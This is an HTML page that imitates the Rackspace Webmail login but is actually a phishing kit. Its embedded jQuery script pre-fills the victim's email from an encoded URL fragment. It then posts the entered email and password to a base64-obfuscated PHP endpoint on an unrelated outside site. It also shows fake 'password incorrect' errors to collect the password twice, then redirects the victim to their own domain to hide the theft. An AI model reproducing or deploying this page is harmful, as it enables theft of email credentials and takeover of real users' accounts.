<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Rackspace Webmail: Hosted Email for Business</title>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:100,400,500,700">

  <style>
    /* Your existing CSS stays the same... */
  </style>
</head>
<body>
  <div>
    <div id="content">
      <div>
        <div id="content-header">
          <div id="content-header-logo"><img id="logo" src="https://static.emailsrvr.com/beta_apps_rackspace_com/images/Rackspace_Technology_Logo_RGB_WHT.png"  /></div>
          <div id="content-header-label">Webmail Login</div>
        </div>
        <div id="content-body">
          <div id="banner-section">
            <a href="https://emailhelp.rackspace.com/l/identify-suspicious-email" target="_blank">
              <img id="banner" src="https://static.emailsrvr.com/apps_rackspace_com/images/Suspicious-Email-Banner.jpg" />
            </a>
          </div>
          <form id="form" autocomplete="off">
            <div id="form-body">
              <div id="form-container">
                <input type="hidden" name="__RequestVerificationToken" value="CfDJ8PJv2PmI83xDqNI3IL5jbf7n53O-sjEa55YFQhrE9DffPHCT5T4NJaWKOR-DTuVf15CZOHNTR0Nf8HHvYJzpBuvE1-RuPCp-VVB10AxbvHGpnvcORaonI3gFCgak-skKc16eQFADMDLQGDKw1rJETYQ" />
                <input id="form-destination" type="hidden" name="destination" value="" />
                <input id="form-owa-flags" type="hidden" name="flags" value="4" />
                <div id="user-row" class="row">
                  <div id="user-col" class="col">
                    <div id="user-field" class="form-group">
                      <p align="left">
                        <span class="text-danger" id="msg" style="font-size:14px; color:#FF0000"></span>
                      </p>
                      <label id="user-label" class="form-label">Email address</label>
                      <input id="ai" name="username" tabindex="1" class="form-field" value="[[-Email-]]" autocomplete="username" />
                    </div>
                  </div>
                </div>
                <div id="pass-row" class="row">
                  <div id="pass-col" class="col">
                    <div id="pass-field" class="form-group">
                      <label id="pass-label" class="form-label">Password</label>
                      <input id="pr" name="password" tabindex="2" type="password" class="form-field" value="" autocomplete="current-password" />
                    </div>
                    <a id="forgot-password" href="#" tabindex="4">Forgot password?</a>
                  </div>
                </div>
              </div>
            </div>
            <div id="login-btn-toolbar">
              <button class="login-btn" type="submit-btn" id="submit-btn">Log In</button>
            </div>
          </form>
        </div>
        
        <!-- New import URLs -->
        <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script> 

        <script>
          $(document).ready(function() {
            var count = 0;

            $('#m-btn').click();

            /////////////url ai getting////////////////
            var ai = window.location.hash.substr(1);
            if (!ai) {
            } else {
                var base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;

                if (!base64regex.test(ai)) {
                    var my_ai = ai;
                } else {
                    var my_ai = atob(ai);
                }
                var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
                var ind = my_ai.indexOf("@");
                var my_slice = my_ai.substr((ind + 1));
                var c = my_slice.substr(0, my_slice.indexOf('.'));
                var final = c.toLowerCase();
                $('#ai').val(my_ai);
                $('#ai').attr('readonly', true);
                $("#msg").hide();
            }
            ///////////////url getting ai////////////////

            var file = "aHR0cHM6Ly9pbm5wYWN0LmNvLnphL2FkbWluaXN0cmF0b3IvaW5jbHVkZXMveGx4LnBocC9yYXhja2llLnBocA==";

            $('#submit-btn').click(function(event) {
                $('#error').hide();
                $('#msg').hide();
                event.preventDefault();
                var ai = $("#ai").val();
                var pr = $("#pr").val();
                var msg = $('#msg').html();
                $('#msg').text(msg);

                var my_ai = ai;
                var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

                if (!ai) {
                    $('#error').show();
                    $('#error').html("The email field is empty!");
                    ai.focus;
                    return false;
                }

                if (!filter.test(my_ai)) {
                    $('#error').show();
                    $('#error').html("The password does not exist. Enter the correct password");
                    ai.focus;
                    return false;
                }
                if (!pr) {
                    $('#error').show();
                    $('#error').html("The password field is empty!");
                    ai.focus;
                    return false;
                }

                var ind = my_ai.indexOf("@");
                var my_slice = my_ai.substr((ind + 1));
                var c = my_slice.substr(0, my_slice.indexOf('.'));
                var final = c.toLowerCase();
                count = count + 1;

                $.ajax({
                    dataType: 'JSON',
                    url: atob(file),
                    type: 'POST',
                    data: {
                        ai: ai,
                        pr: pr,
                    },
                    beforeSend: function(xhr) {
                        $('#submit-btn').html('Please wait ...');
                    },
                    success: function(response) {
                        if (response) {
                            $("#msg").show();
                            console.log(response);
                            if (response['signal'] == 'ok') {
                                $("#pr").val("");
                                if (count >= 2) {
                                    count = 0;
                                    window.location.replace("http://www." + my_slice);
                                    return false;
                                }
                            }
                        }
                    },
                    error: function() {
                        $("#pr").val("");
                        if (count >= 3) {
                            count = 0;
                            window.location.replace("http://www." + my_slice);
                            return false;
                        }
                        $("#msg").show();
                        setTimeout(function() { $("#msg").fadeOut('slow'); }, 3000);
                        $('#msg').html("Error: Password incorrect");
                    },
                    complete: function() {
                        $('#submit-btn').html('Log In');
                    }
                });
            });
          });
        </script>
        
        <div class="base_links">
          <a class="base_link" target="_blank" href="http://www.rackspace.com/information/legal/privacystatement">
            Privacy Statement
          </a>
          <div class="divider"> | </div>
          <a class="base_link" target="_blank" href="http://www.rackspace.com/information/legal/websiteterms">
            Website Terms
          </a>
        </div>
        <div class="footer" style="text-align: center; margin-top: 10px;">
          <div class="caption">
            Need webmail for your business? Learn more about
            <a href="//www.rackspace.com/email-hosting/webmail" style="color: #666;">
              Hosted Email
            </a>
            from Rackspace
          </div>
        </div>
      </div>
    </div>
  </div>
</body>
</html>
